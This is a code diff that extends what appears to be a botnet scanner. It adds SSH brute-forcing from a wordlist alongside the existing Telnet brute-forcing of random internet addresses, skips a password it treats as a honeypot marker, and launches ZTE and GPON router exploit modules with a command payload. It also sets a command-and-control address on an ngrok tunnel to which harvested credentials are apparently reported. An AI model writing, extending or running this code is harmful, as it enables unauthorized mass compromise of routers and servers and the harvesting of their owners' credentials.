@@ -1,11 +1,18 @@
-from lib import telnet, tools, network, console
-import threading, socket, time
+from lib import telnet, tools, network, console, ssh
+from scanners import ZTE, GPON
+import threading, socket, time, os
 
 __SCAN_TELNET__ = True
-__SCAN_THREAD__ = 1000
+__SCAN_GPON__   = True
+__SCAN_ZTE__    = True
+__SCAN_SSH__    = True
 
-__CNC_ADDR__ = '0.tcp.ngrok.io'
-__CNC_PORT__ = 12681
+__SCAN_THREAD__ = 300
+
+__CNC_ADDR__ = '8.tcp.ngrok.io'
+__CNC_PORT__ = 1337
+
+__PAYLOAD__  = 'whoami'
 
 class Data:
     def __init__(self):
@@ -73,7 +80,8 @@ class TelnetScanner(threading.Thread):
             res = telnet.Telnet(ip, port, username, password).connect(2, True)
 
             if res == True:
-                self.data.found.append(f'scan|{ip}|{port}|{username}|{password}|telnet') # scan|ip|port|user|pass|type
+                if password != 'lmao': # honeypot prevention
+                    self.data.found.append(f'scan|{ip}|{port}|{username}|{password}|telnet') # scan|ip|port|user|pass|type
                 break
             
             elif res == 'error':
@@ -88,13 +96,67 @@ class TelnetScanner(threading.Thread):
                     threading.Thread(target= self.brute, args=(addr, port,)).start()
     
     def run(self):
-        if __SCAN_TELNET__ == False:
-            return
-        
-        for _ in range(__SCAN_THREAD__):
-            threading.Thread(target= self.scan).start()
+        if __SCAN_TELNET__ != False:
+            for _ in range(__SCAN_THREAD__):
+                threading.Thread(target= self.scan).start()
+
+class SshScanner(threading.Thread):
+    def __init__(self, data: Data):
+        threading.Thread.__init__(self)
+
+        self.data = data
+        self.ip_tools = tools.IP_Tools()
+        self.port_checker = network.Port()
+        self.ssh_credential = open('./asset/ssh_wordlist.txt', 'r+').read().splitlines()
+
+    def brute(self, ip: str, port: int):
+        for credential in self.ssh_credential:
+            username = credential.split(':')[0]
+            password = credential.split(':')[1]
+
+            res = ssh.Ssh(ip, port, username, password).connect(2, True)
+
+            if res == True:
+                if password != 'lmao': # honeypot prevention
+                    self.data.found.append(f'scan|{ip}|{port}|{username}|{password}|ssh') # scan|ip|port|user|pass|type
+                break
+            
+            elif res == 'error':
+                break
+
+    def scan(self):
+        while True:
+            addr = self.ip_tools.get_ip_addr()
+            
+            for port in [22]:
+                if self.port_checker.check_open(addr, port):
+                    threading.Thread(target= self.brute, args=(addr, port,)).start()
+    
+    def run(self):
+        if __SCAN_SSH__ != False:
+            for _ in range(__SCAN_THREAD__):
+                threading.Thread(target= self.scan).start()
+
+class ZTEScanner(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+    
+    def run(self):
+        if __SCAN_ZTE__:
+            print('Windows users can\'t scan for ZTE') if os.name == 'nt' else ZTE.run(__PAYLOAD__)
+
+class GPONScanner(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+    
+    def run(self):
+        if __SCAN_GPON__:
+            print('Windows users can\'t scan for GPON') if os.name == 'nt' else GPON.run(__PAYLOAD__)
 
 if __name__ == '__main__':
     D = Data()
+    ZTEScanner().start()
+    GPONScanner().start()
+    SshScanner(D).start()
     TelnetScanner(D).start()
     MasterConnection(D).start()
